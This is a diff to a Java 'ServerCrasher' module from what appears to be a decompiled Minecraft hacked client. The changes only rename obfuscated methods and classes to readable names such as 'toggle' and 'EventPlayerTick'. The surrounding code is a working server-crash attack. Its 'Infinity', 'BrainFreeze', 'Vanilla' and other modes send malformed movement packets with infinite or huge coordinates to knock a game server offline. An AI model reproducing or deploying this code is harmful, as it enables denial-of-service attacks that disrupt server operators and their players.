@@ -27,12 +27,12 @@ public class ServerCrasher extends PremiumModule
     }
     
     @EventListener
-    private void method10629(final Class5743 class5743) {
+    private void method10629(final EventPlayerTick eventPlayerTick) {
         if (!this.isEnabled()) {
             return;
         }
         if (ServerCrasher.mc.method5284()) {
-            this.method9910();
+            this.toggle();
             return;
         }
         final String method9887 = this.getStringSettingValueByName("Mode");
@@ -51,7 +51,7 @@ public class ServerCrasher extends PremiumModule
                     ServerCrasher.mc.method5269().method17292(new Class4354(field2395 - n3, field2396 + n2, field2397 + n3, false));
                 }
                 Class9274.method34209("Trying to crash the server..");
-                this.method9910();
+                this.toggle();
                 break;
             }
             case "Vanilla": {
@@ -87,20 +87,20 @@ public class ServerCrasher extends PremiumModule
                     }
                     catch (final Exception ex) {}
                 }
-                this.method9910();
+                this.toggle();
                 break;
             }
             case "Infinity": {
                 ServerCrasher.mc.method5269().method17292(new Class4354(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
                 Class9274.method34209("Trying to crash the server..");
-                this.method9910();
+                this.toggle();
                 break;
             }
             case "BrainFreeze": {
                 ServerCrasher.mc.method5269().method17292(new Class4354(ServerCrasher.mc.player.posX + 9999.0, ServerCrasher.mc.player.posY + 9999.0, ServerCrasher.mc.player.posZ + 9999.0, false));
                 ServerCrasher.mc.method5269().method17292(new Class4354(ServerCrasher.mc.player.posX, ServerCrasher.mc.player.getBoundingBox().minY, ServerCrasher.mc.player.posZ + 9999.0, ServerCrasher.mc.player.onGround));
                 if (this.field15991++ >= 200) {
-                    this.method9910();
+                    this.toggle();
                     Class9274.method34209("Trying to crash the server..");
                     break;
                 }
